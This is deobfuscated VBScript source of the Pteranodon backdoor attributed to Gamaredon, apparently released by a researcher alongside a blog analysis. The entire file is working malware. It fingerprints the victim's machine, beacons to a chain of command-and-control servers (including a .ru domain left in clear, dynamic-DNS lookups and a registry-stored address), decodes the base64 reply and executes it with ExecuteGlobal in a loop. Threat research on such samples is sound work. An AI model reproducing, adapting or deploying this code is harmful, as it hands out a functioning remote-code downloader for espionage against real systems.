' This is a fully deobfuscated version of pteranodon (Gamaredon)
' Deobfuscated by Robin Dost
' IPs & URL's have been removed for security purposes
' https://blog.synapticsystems.de/inside-gamaredon-2025-zero-click-espionage-at-scale/

dim C2_RETRY_FLAG, EXECUTABLE_PAYLOAD, urlTarget, computerName
Dim victimId, SLEEP_AFTER_EXECUTION
Dim httpMethod

Dim OBJ_WSCRIPT_SHELL
OBJ_WSCRIPT_SHELL = "WScript.Shell"

Dim ENV_COMPUTERNAME
ENV_COMPUTERNAME = "%computername%"

Dim OBJ_FSO
OBJ_FSO = "Scripting.FileSystemObject"

Dim ENV_SYSTEMDRIVE
ENV_SYSTEMDRIVE = "%systemdrive%"

Dim C2_PRIMARY
C2_PRIMARY = "http://<IP-Address>"

Dim C2_FALLBACK_1
C2_FALLBACK_1 = "https://<cloudflare or microsoft worker url>"

Dim DOMAIN_SECONDARY
DOMAIN_SECONDARY = "<someRussianC2Domain>.ru"

Dim CHECK_HOST_URL
CHECK_HOST_URL = "https://check-host.net/ip-info?host=<someRandomDynDnsDomain>"

Dim REGEX_HTML_STRONG
REGEX_HTML_STRONG = "\<strong\>(.*?)\<\/strong\>\<\/td\>"

Dim URL_ENDING
URL_ENDING = URL_ENDING + "vabundanceVOI"

Dim DEFAULT_USER_AGENT
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.41 YaBrowser/21.2.0.1097 Yowser/2.5 Safari/537.36" & "::"

Dim RANDOM_CHARS
RANDOM_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

Dim REGKEY_PERSISTENCE
REGKEY_PERSISTENCE = "HKEY_CURRENT_USER\Console\WindowsResponby"


'======== Functions ===========

function DecodeBinaryUtf8(binaryData)

    determinedhw = binaryData
    set stream = createobject("adodb.stream")
    stream.type = 1
    stream.open
    stream.write determinedhw
    stream.position = 0
    stream.type = 2
    stream.charset = "utf-8"

    DecodeBinaryUtf8 = stream.readtext

end function

'=========================


Function FetchC2Payload(urlTarget)

    SleepMs 3407
    requestUrl = urlTarget & "/" & GenerateRandomFilename

    set httpRequest = createobject("msxml2.xmlhttp")

    httpErrorCount = 0

    httpRequest.open httpMethod, requestUrl, false
    httpRequest.setrequestheader "user-agent", BuildUserAgentString(computerName, victimId) & "/" & urlTarget
    httpRequest.setRequestHeader "Cookie", "hollowu2B"
    httpRequest.setRequestHeader "Content-Length", "2362"
    httpRequest.send

    STATUS_OK = 200
    STATUS_NOT_FOUND = 404

    if not httpRequest.status = STATUS_OK and not httpRequest.status = STATUS_NOT_FOUND Then
        urlTarget = ""

        exit function

    end if

    If (httpRequest.status = STATUS_OK) Then


        responseTextDecoded = DecodeBinaryUtf8(httpRequest.responsebody)

        if Len(responseTextDecoded) > 76 Then

        FetchC2Payload = responseTextDecoded
        SleepMs 3407
        C2_PRIMARY = Left(urlTarget, Instr(9, urlTarget, "/", 1)-1)
        C2_RETRY_FLAG = 0

        exit function

        end if

    Else

        C2_RETRY_FLAG = 1

        exit function

    End If


    If (httpRequest.status = STATUS_NOT_FOUND) Then

        C2_PRIMARY = Left(urlTarget, Instr(9, urlTarget, "/", 1)-1)

        C2_RETRY_FLAG = 0

        exit function

    end if


    Set httpRequest = Nothing

End Function
 

'=========================

function GetRandomArrayItem(arr)

    randomIndex = Int(Rnd()*UBound(arr) + 1) - 1
    GetRandomArrayItem = arr(randomIndex)

end function
 
'=========================

function SleepMs(sleepMs)


modifyYbk = WScript.Sleep(sleepMs)


end function

'=========================

Function RemoveSubstring(inputString, pattern)


RemoveSubstring = replace(inputString, pattern, "")

end function
 
'=========================

Function GetComputerName()
 
GetComputerName = createobject(OBJ_WSCRIPT_SHELL).expandenvironmentstrings(ENV_COMPUTERNAME)
createobject(OBJ_WSCRIPT_SHELL).expandenvironmentstrings(ENV_COMPUTERNAME)

end function
 
'=========================

Function GetSystemDriveSerialHex()

    loopCounter = 1
    juniorH3i = 1

    Do Until loopCounter = 1426

        loopCounter = loopCounter +1

        createobject(OBJ_WSCRIPT_SHELL).expandenvironmentstrings(ENV_SYSTEMDRIVE)

    
    loop


    driveSerial = createobject(OBJ_FSO).getdrive(createobject(OBJ_WSCRIPT_SHELL).expandenvironmentstrings(ENV_SYSTEMDRIVE)).serialnumber


    Do Until juniorH3i = 1892
        juniorH3i = juniorH3i +1

        createobject(OBJ_FSO).getdrive(createobject(OBJ_WSCRIPT_SHELL).expandenvironmentstrings(ENV_SYSTEMDRIVE)).serialnumber

    loop


    driveSerialHex = hex(driveSerial)
    GetSystemDriveSerialHex = driveSerialHex

end function

'=========================

Function BuildUserAgentString(computerName, victimId)

    uaSuffix = ":"
    uaSuffix = uaSuffix + ":"
    uaSuffix = uaSuffix + "/"
    uaSuffix = uaSuffix + "."
    uaSuffix = uaSuffix & URL_ENDING
    uaSuffix = uaSuffix + "/"
    uaSuffix = uaSuffix + "."

    BuildUserAgentString = DEFAULT_USER_AGENT
    BuildUserAgentString = BuildUserAgentString & computerName
    BuildUserAgentString = BuildUserAgentString & "_"
    BuildUserAgentString = BuildUserAgentString & victimId
    BuildUserAgentString = BuildUserAgentString & uaSuffix

end function

'=========================

Function GenerateRandomFilename()
    minLength = 5
    maxLength = 10
    randomLength = Int((maxLength - minLength + 1)*Rnd + minLength)


    For loopCounter = 1 to randomLength
        randomFilenameBody = randomFilenameBody & Mid(RANDOM_CHARS, Int((Len(RANDOM_CHARS))*Rnd +1 ), 1)
    Next

    fileExtensions = array("html","php","jpeg","jpg","7z","bmp","avi","pdf","rar","zip","mp4","mp3","wav")
    extArrayMaxIndex = UBound(fileExtensions)
    
    extIndex = Int(Rnd()*extArrayMaxIndex + 1) - 1
    
    GenerateRandomFilename = randomFilenameBody & "." & fileExtensions(extIndex)

End Function

'=========================

'======= Script Start ========


Set WscriptShellObj = CreateObject(OBJ_WSCRIPT_SHELL)
LOOP_MAX = 20347
loopCounter = 87
SLEEP_AFTER_EXECUTION = 204762
 

do while loopCounter < LOOP_MAX
    
    computerName = GetComputerName
    victimId = GetSystemDriveSerialHex
    SleepMs 1269
    C2_RETRY_FLAG = 1
    rawPayloadBase64 = FetchC2Payload(C2_PRIMARY)


    if (C2_RETRY_FLAG = 1) then

        rawPayloadBase64 = FetchC2Payload(C2_FALLBACK_1)

    End if

    if (C2_RETRY_FLAG = 1) then

        SleepMs 11551
        
        c2DynamicAddress = "https://" & GenerateRandomFilename & "@" & DOMAIN_SECONDARY
        rawPayloadBase64 = FetchC2Payload(c2DynamicAddress)


    End if

    if (C2_RETRY_FLAG = 1) then

        SleepMs 11551

        set xmlHttpObj = createobject("msxml2.xmlhttp")
        xmlHttpObj.open "post", CHECK_HOST_URL, false
        xmlHttpObj.send

        set regexpObj = createobject("scipt.regexp")
        regexpObj.pattern = REGEX_HTML_STRONG
        regexpObj.multiline = true
        regexpObj.global = true

        set objmatches = regexpObj.execute(DecodeBinaryUtf8(xmlHttpObj.responsebody))
        match = objmatches(0).submatches(0)

        rawPayloadBase64 = FetchC2Payload("http://" & match)

    end if

    if (C2_RETRY_FLAG = 1) then
    
        c2DynamicAddress2 = "https://"
        c2DynamicAddress2 = c2DynamicAddress2 & GenerateRandomFilename
        c2DynamicAddress2 = c2DynamicAddress2 & "@"
        c2DynamicAddress2 = c2DynamicAddress2 & "antresolle.ru"
        rawPayloadBase64 = FetchC2Payload(c2DynamicAddress2)

    End if

    if (C2_RETRY_FLAG = 1) then

        SleepMs 11551

        
        registryStoredC2 = WscriptShellObj.RegRead(REGKEY_PERSISTENCE)
        rawPayloadBase64 = FetchC2Payload(registryStoredC2 & "/" & GenerateRandomFilename)


    End if
    

    rawPayloadBase64 = RemoveSubstring(rawPayloadBase64, vbcr)
    rawPayloadBase64 = RemoveSubstring(rawPayloadBase64, vblf)
    rawPayloadBase64 = RemoveSubstring(rawPayloadBase64, "&&")
    set base64Node = createobject("msxml2.domdocument.3.0").createelement("base64")
    base64Node.datatype = "bin.base64"
    base64Node.text = rawPayloadBase64
    decodedBinary = base64Node.nodetypedvalue
    EXECUTABLE_PAYLOAD = DecodeBinaryUtf8(decodedBinary)


    SleepMs 1269
    ExecuteGlobal(EXECUTABLE_PAYLOAD)


    SleepMs SLEEP_AFTER_EXECUTION

Loop
